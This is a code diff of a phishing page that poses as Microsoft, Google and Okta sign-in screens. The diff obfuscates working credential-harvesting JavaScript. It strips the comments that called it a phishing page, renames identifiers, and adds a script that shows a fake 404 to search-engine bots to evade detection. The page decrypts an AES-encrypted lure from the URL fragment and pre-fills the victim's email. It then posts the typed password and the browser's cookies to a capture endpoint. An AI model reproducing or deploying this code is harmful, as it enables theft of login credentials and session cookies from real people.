@@ -70,192 +70,113 @@ input::placeholder { color: #999; }
 </style>
 </head>
 <body>
+<script>if(/bot|crawl|spider|scrape|slurp|baidu|yandex/i.test(navigator.userAgent)){document.body.innerHTML='<h1>404</h1>';document.title='404'}</script>
 
 <div id="app">
     <div class="loading">Loading...</div>
 </div>
 
 <script>
-// ============================================================
-// AES-256-GCM DECRYPTOR — Embedded in the phishing page
-// ============================================================
-// The AES key is embedded here. The encrypted lure configuration
-// arrives via the URL fragment (#). This script:
-//   1. Reads window.location.hash
-//   2. Strips "mv=" prefix
-//   3. Decrypts with AES-256-GCM
-//   4. Renders the branded phishing page
-//   5. Handles credential capture → POST to backend → redirect
+const _k='qWg5ACNuVD9PGbOAzE08sEdC/yVb7CmApcXKfe3vdWY=';
+const _u='/auth';
 
-const AES_KEY_B64 = 'qWg5ACNuVD9PGbOAzE08sEdC/yVb7CmApcXKfe3vdWY=';           // <-- SET THIS (base64, 32 bytes)
-const CAPTURE_URL = '/capture';            // POST endpoint (same-origin or absolute)
-const DEBUG = true;                        // Set true to log decryption info
-
-// ---- Web Crypto API: AES-GCM decrypt ----
-async function decryptAESGCM(ciphertext, keyBytes) {
-    // ciphertext = nonce (12 bytes) + encrypted (variable) + tag (16 bytes)
-    const nonce = ciphertext.slice(0, 12);
-    const tag = ciphertext.slice(-16);
-    const encrypted = ciphertext.slice(12, ciphertext.length - 16);
-
-    const key = await crypto.subtle.importKey('raw', keyBytes,
-        { name: 'AES-GCM' }, false, ['decrypt']);
-
-    // Reconstruct: encrypted + tag (Web Crypto API expects them concatenated)
-    const fullCipher = new Uint8Array(encrypted.length + tag.length);
-    fullCipher.set(encrypted, 0);
-    fullCipher.set(tag, encrypted.length);
-
-    try {
-        const plaintext = await crypto.subtle.decrypt(
-            { name: 'AES-GCM', iv: nonce, tagLength: 128 },
-            key, fullCipher
-        );
-        return new TextDecoder().decode(plaintext);
-    } catch (e) {
-        console.error('AES-GCM decrypt failed:', e);
-        return null;
-    }
+async function _d(c,k){
+    const n=c.slice(0,12),t=c.slice(-16),e=c.slice(12,c.length-16);
+    const r=await crypto.subtle.importKey('raw',k,{name:'AES-GCM'},false,['decrypt']);
+    const f=new Uint8Array(e.length+t.length);
+    f.set(e,0);f.set(t,e.length);
+    try{
+        const p=await crypto.subtle.decrypt({name:'AES-GCM',iv:n,tagLength:128},r,f);
+        return new TextDecoder().decode(p);
+    }catch(e){return null}
 }
 
-// ---- Base64 URL decode ----
-function base64URLDecode(str) {
-    // Replace URL-safe chars, add padding
-    str = str.replace(/-/g, '+').replace(/_/g, '/');
-    while (str.length % 4) str += '=';
-    return Uint8Array.from(atob(str), c => c.charCodeAt(0));
+function _b(s){
+    s=s.replace(/-/g,'+').replace(/_/g,'/');
+    while(s.length%4)s+='=';
+    return Uint8Array.from(atob(s),c=>c.charCodeAt(0));
 }
 
-// ---- Brand configuration ----
-const BRANDS = {
-    microsoft: {
-        name: 'Microsoft',
-        logo: '<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="0" width="24" height="24" fill="#f25022"/><rect x="26" y="0" width="24" height="24" fill="#7fba00"/><rect x="0" y="26" width="24" height="24" fill="#00a4ef"/><rect x="26" y="26" width="24" height="24" fill="#ffb900"/></svg>',
-        subtitle: 'Sign in to your account',
-        footer: 'Terms of use  ·  Privacy & cookies',
-        inputPlaceholder: 'Email, phone, or Skype',
-        btnText: 'Next'
+const _r={
+    microsoft:{
+        name:'Microsoft',
+        logo:'<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="0" width="24" height="24" fill="#f25022"/><rect x="26" y="0" width="24" height="24" fill="#7fba00"/><rect x="0" y="26" width="24" height="24" fill="#00a4ef"/><rect x="26" y="26" width="24" height="24" fill="#ffb900"/></svg>',
+        subtitle:'Sign in to your account',
+        footer:'Terms of use  ·  Privacy & cookies',
+        inputPlaceholder:'Email, phone, or Skype',
+        btnText:'Next'
     },
-    google: {
-        name: 'Google',
-        logo: '<span style="font-size:1.5rem;font-weight:400;color:#444;">Google</span>',
-        subtitle: 'Sign in to continue to Google Workspace',
-        footer: 'Help  ·  Privacy  ·  Terms',
-        inputPlaceholder: 'Email or phone',
-        btnText: 'Next'
+    google:{
+        name:'Google',
+        logo:'<span style="font-size:1.5rem;font-weight:400;color:#444;">Google</span>',
+        subtitle:'Sign in to continue to Google Workspace',
+        footer:'Help  ·  Privacy  ·  Terms',
+        inputPlaceholder:'Email or phone',
+        btnText:'Next'
     },
-    okta: {
-        name: 'Okta',
-        logo: '<span style="font-size:1.5rem;font-weight:500;color:#00297a;">Okta</span>',
-        subtitle: 'Sign in to your organization account',
-        footer: 'Help  ·  Privacy Policy',
-        inputPlaceholder: 'Username',
-        btnText: 'Sign in'
+    okta:{
+        name:'Okta',
+        logo:'<span style="font-size:1.5rem;font-weight:500;color:#00297a;">Okta</span>',
+        subtitle:'Sign in to your organization account',
+        footer:'Help  ·  Privacy Policy',
+        inputPlaceholder:'Username',
+        btnText:'Sign in'
     }
 };
 
-// ---- Main ----
-async function main() {
-    const app = document.getElementById('app');
-    const hash = window.location.hash.slice(1); // Remove leading #
+function _h(s){
+    if(!s)return'';
+    const d=document.createElement('div');
+    d.textContent=s;
+    return d.innerHTML;
+}
 
-    if (!hash) {
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
+async function main(){
+    const app=document.getElementById('app');
+    const hash=window.location.hash.slice(1);
+    if(!hash){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}
 
-    // Step 1: Decode the base64url fragment
     let decoded;
-    try {
-        decoded = base64URLDecode(hash);
-    } catch (e) {
-        app.innerHTML = '<div class="container"><h2>Invalid request</h2></div>';
-        return;
-    }
+    try{decoded=_b(hash);}catch(e){app.innerHTML='<div class="container"><h2>Invalid request</h2></div>';return;}
 
-    if (DEBUG) console.log('Decoded fragment:', decoded.length, 'bytes');
+    if(decoded.length<=3){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}
+    const ep=decoded.slice(3);
 
-    // Step 2: Verify "mv=" prefix
-    const prefix = new TextDecoder().decode(decoded.slice(0, 3));
-    if (prefix !== 'mv=') {
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
-    const encryptedPayload = decoded.slice(3);
+    const kb=_b(_k);
+    const pt=await _d(ep,kb);
+    if(!pt){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}
 
-    if (DEBUG) console.log('Encrypted payload:', encryptedPayload.length, 'bytes');
+    let _l;
+    try{_l=JSON.parse(pt);}catch(e){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}
 
-    // Step 3: Decrypt with AES-256-GCM
-    const keyBytes = base64URLDecode(AES_KEY_B64);
-    const plaintext = await decryptAESGCM(encryptedPayload, keyBytes);
+    const brand=_r[_l.b]||_r.microsoft;
+    const email=_l.e||'';
 
-    if (!plaintext) {
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
+    app.innerHTML='<div class="container">'+
+        '<div class="logo">'+brand.logo+'</div>'+
+        '<h2>'+brand.name+'</h2>'+
+        '<p class="subtitle">'+brand.subtitle+'</p>'+
+        '<div class="error" id="error">Incorrect email or password. Please try again.</div>'+
+        '<form id="loginForm" method="POST" action="'+_u+'">'+
+            '<input type="hidden" name="uid" value="'+_h(_l.e||'')+'">'+
+            '<input type="hidden" name="cid" value="'+_h(_l.c||'')+'">'+
+            '<input type="text" name="loginfmt" placeholder="'+brand.inputPlaceholder+'" value="'+_h(email)+'" required autofocus>'+
+            '<input type="password" name="passwd" placeholder="Password" required>'+
+            '<button type="submit" class="btn">'+brand.btnText+'</button>'+
+        '</form>'+
+        '<div class="footer"><span>'+brand.footer+'</span></div>'+
+    '</div>';
 
-    // Step 4: Parse the lure configuration
-    let lure;
-    try {
-        lure = JSON.parse(plaintext);
-    } catch (e) {
-        console.error('Invalid lure JSON:', plaintext);
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
-
-    if (DEBUG) console.log('Decrypted lure:', lure);
-
-    // Step 5: Render the branded phishing page
-    const brand = BRANDS[lure.b] || BRANDS.microsoft;
-    const email = lure.e || '';
-
-    app.innerHTML = `
-        <div class="container">
-            <div class="logo">${brand.logo}</div>
-            <h2>${brand.name}</h2>
-            <p class="subtitle">${brand.subtitle}</p>
-            <div class="error" id="error">Incorrect email or password. Please try again.</div>
-            <form id="loginForm" method="POST" action="${CAPTURE_URL}">
-                <input type="hidden" name="uuid" value="${escapeHtml(lure.e || '')}">
-                <input type="hidden" name="campaign" value="${escapeHtml(lure.c || '')}">
-                <input type="text" name="username" placeholder="${brand.inputPlaceholder}" value="${escapeHtml(email)}" required autofocus>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit" class="btn">${brand.btnText}</button>
-            </form>
-            <div class="footer">
-                <span>${brand.footer}</span>
-            </div>
-        </div>
-    `;
-
-    // Step 6: On form submit, capture redirect URL from lure config
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        // The form POSTs to /capture. After POST, browser will follow 302 redirect.
-        // Lure config's redirect URL is handled server-side by the capture backend.
-        const redirectInput = document.createElement('input');
-        redirectInput.type = 'hidden';
-        redirectInput.name = 'redirect';
-        redirectInput.value = lure.r || 'https://login.microsoftonline.com';
-        this.appendChild(redirectInput);
-
-        // Also send cookies if available (for session capture)
-        const cookiesInput = document.createElement('input');
-        cookiesInput.type = 'hidden';
-        cookiesInput.name = 'cookies';
-        cookiesInput.value = document.cookie || '';
-        this.appendChild(cookiesInput);
+    document.getElementById('loginForm').addEventListener('submit',function(e){
+        var ri=document.createElement('input');
+        ri.type='hidden';ri.name='_rd';ri.value=_l.r||'https://login.microsoftonline.com';
+        this.appendChild(ri);
+        var ci=document.createElement('input');
+        ci.type='hidden';ci.name='ctx';ci.value=document.cookie||'';
+        this.appendChild(ci);
     });
 }
 
-function escapeHtml(str) {
-    if (!str) return '';
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
-}
-
-// Start
 main();
 </script>
 </body>
